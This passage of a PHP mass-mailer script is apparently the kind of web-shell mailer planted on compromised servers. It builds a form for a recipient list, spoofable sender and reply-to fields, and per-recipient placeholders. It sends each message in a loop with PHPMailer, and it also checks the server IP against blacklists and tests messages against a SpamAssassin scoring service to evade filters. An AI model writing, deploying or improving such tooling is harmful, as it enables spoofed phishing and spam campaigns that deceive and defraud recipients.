uQmCC" style="width:100%;max-width:300px"></h3>
        <form name="form" id="form" method="POST" enctype="multipart/form-data" action="">
                    <input type="hidden" name="action" value="score">

            <div class="row" hidden>
                <div class="form-group col-lg-6 "><label for="senderEmail">Email</label><input type="text" class="form-control  input-sm " id="senderEmail" name="senderEmail" value="'.$senderEmail.'"></div>
                <div class="form-group col-lg-6 "><label for="senderName">Sender Name</label><input type="text" class="form-control  input-sm " id="senderName" name="senderName" value="'.$senderName.'"></div>
            </div>
            <div class="row" hidden>
                <span class="form-group col-lg-6  "><label for="attachment">Attachment <small>(Multiple Available)</small></label><input type="file" name="attachment[]" id="attachment[]" multiple/></span>

                <div class="form-group col-lg-6"><label for="replyTo">Reply-to</label><input type="text" class="form-control  input-sm " id="replyTo" name="replyTo" value="'.$replyTo.'" /></div>
            </div>
            <div class="row" hidden>
                <div class="form-group col-lg-12 "><label for="subject">Subject</label><input type="text" class="form-control  input-sm " id="subject" name="subject" value="'.$subject.'" /></div>
            </div>
            <div class="row">
                <div hidden class="form-group col-lg-6"><label for="messageLetter">Message Letter <button type="submit" class="btn btn-default btn-xs" form="form" name="action" value="view" formtarget="_blank">Preview </button></label><textarea name="messageLetter" id="messageLetter" class="form-control" rows="10" id="textArea">'.$messageLetter.'</textarea></div>
                <div class="form-group col-lg-6 col-lg-offset-3"><label for="emailList">Email List</label><textarea style="text-align:center" name="emailList" id="emailList" class="form-control" rows="10" id="textArea">'.$emailList.'</textarea></div>
            </div>
            <div class="row" hidden>
                <div class="form-group col-lg-6 ">
                    <label for="messageType">Message Type</label>
                    HTML <input type="radio" name="messageType" id="messageType" value="1" '.$html.'>
                    Plain<input type="radio" name="messageType" id="messageType" value="2" '.$plain.'>
                </div>
                <div class="form-group col-lg-3 ">
                    <label for="charset">Character set</label>
                    <select class="form-control input-sm" id="charset" name="charset">
                        <option '.$utf8.'>UTF-8</option>
                        <option '.$iso.'>ISO-8859-1</option>
                    </select>
                </div>
                <div class="form-group col-lg-3 ">
                    <label for="encoding">Message encoding</label>
                    <select class="form-control input-sm" id="encode" name="encode">
                        <option '.$bit8.'>8bit</option>
                        <option '.$bit7.'>7bit</option>
                        <option '.$binary.'>binary</option>
                        <option '.$base64.'>base64</option>
                        <option '.$quotedprintable.'>quoted-printable</option>

                    </select>
                </div>
            </div>
            <button type="submit" class="btn btn-success btn-sm" form="form" name="action" value="send">FLY INBOX CALLY</button> <a hidden href="#" onclick="document.getElementById(\'form\').submit(); return false;">check SpamAssassin Score</a>
   
        </form>
    </div>
    <div class="col-lg-6" hidden><br>
        <label for="well">Instruction</label>
        <div id="well" class="well well">
            <h4>Server Information</h4>
            <ul>
                <li>Server IP Address : <b>'.$_SERVER['SERVER_ADDR'].' </b> <a href="?check_ip='.$_SERVER['SERVER_ADDR'].'" target="_blank" class="label label-primary">Check Blacklist <i class="glyphicon glyphicon-search"></i></a></li>
                <li>PHP Version : <b>'.phpversion().'</b></li>
                

            </ul>
            <h4>HELP</h4>
            <ul>
                <li>[-email-] : <b>Reciver Email</b> (emailuser@emaildomain.com)</li>
                <ul>
                    <li>[-emailuser-] : <b>Email User</b> (emailuser) </li>
                    <li>[-emaildomain-] : <b>Email User</b> (emaildomain.com) </li>
                </ul>
                <li>[-time-] : <b>Date and Time</b> ('.date("m/d/Y h:i:s a", time()).')</li>
                
                <li>[-randomstring-] : <b>Random string (0-9,a-z)</b></li>
                <li>[-randomnumber-] : <b>Random number (0-9) </b></li>
                <li>[-randomletters-] : <b>Random Letters(a-z) </b></li>
                <li>[-randommd5-] : <b>Random MD5 </b></li>
            </ul>
            <h4>example</h4>
            Receiver Email = <b>user@domain.com</b><br>
            <ul>
                <li>hello <b>[-emailuser-]</b> = hello <b>user</b></li>
                <li>your domain is <b>[-emaildomain-]</b> = Your Domain is <b>domain.com</b></li>
                <li>your code is  <b>[-randommd5-]</b> = your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>
            </ul>

            <h6>by <b><a href="http://'.$leaf['website'].'">'.$leaf['website'].'</a></b></h6>
        </div>
    </div>';  
if($_POST['action']=="send"){
    print '    <div class="col-lg-6 col-lg-offset-3">';
    $maillist=explode("\r\n", $emailList);
    $n=count($maillist);
    $x =1;
    foreach ($maillist as $email ) {
        print '<div class="col-lg-2">['.$x.'/'.$n.']</div><div class="col-lg-6">'.$email.'</div>';
        if(!leafMailCheck($email)) {
            print '<div class="col-lg-4"><span class="label label-default">Incorrect Email</span></div>';
            print "<br>\r\n";
        }
        else {
            $mail = new PHPMailer;
            $mail->setFrom(leafClear($senderEmail,$email),leafClear($senderName,$email));
            $mail->addReplyTo(leafClear($replyTo,$email));
            $mail->addAddress($email);
            $mail->Subject = leafClear($subject,$email);
            $mail->Body =  leafClear($messageLetter,$email);
            if($messageType==1){
                $mail->IsHTML(true);
                $mail->AltBody =strip_tags(leafClear($messageLetter,$email));
            }
            else $mail->IsHTML(false);
            $mail->CharSet = $charset;
            $mail->Encoding = $encoding;
            for($i=0; $i<count($_FILES['attachment']['name']); $i++) {
                if ($_FILES['attachment']['tmp_name'][$i] != ""){
                    $mail->AddAttachment($_FILES['attachment']['tmp_name'][$i],$_FILES['attachment']['name'][$i]);
                }

            }
            
            if (!$mail->send()) {
                echo '<div class="col-lg-4"><span class="label label-default">'.htmlspecialchars($mail->ErrorInfo).'</span></div>';
            }
            else {
                echo '<div class="col-lg-4"><span class="label label-success">Ok</span></div>';
            }
            print "<br>\r\n";
        }
        $x++;
        for($k = 0; $k < 40000; $k++) {echo ' ';}
    }

}
elseif($_POST['action']=="score"){
    $mail = new PHPMailer;
    $mail->setFrom(leafClear($senderEmail,$email),leafClear($senderName,$email));
    $mail->addReplyTo(leafClear($replyTo,$email));
    $mail->addAddress("username@domain.com");
    $mail->Subject = leafClear($subject,$email);
    $mail->Body =  leafClear($messageLetter,$email);
    if($messageType==1){
        $mail->IsHTML(true);
        $mail->AltBody =strip_tags(leafClear($messageLetter,$email));
    }
    else $mail->IsHTML(false);
    $mail->CharSet = $charset;
    $mail->Encoding = $encoding;
    $mail->preSend();
    $messageHeaders=$mail->getSentMIMEMessage();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, 'http://spamcheck.postmarkapp.com/filter');
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('email' => $messageHeaders,'options'=>'long')));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $response = curl_exec($ch);
    $response = json_decode($response);
    print '    <div class="col-lg-12">';
    if ($response->success == TRUE ){
        $score = $response->score;
        if ($score > 5 ) $class="danger";
        else $class="success";
            print '<div class="text-'.$class.'">Your SpamAssassin score is '.$score.'  </div>
<div>Full Report : <pre>'.$response->report.'</pre></div>';
print '    </div>';
    }
}
print '</body>';
?>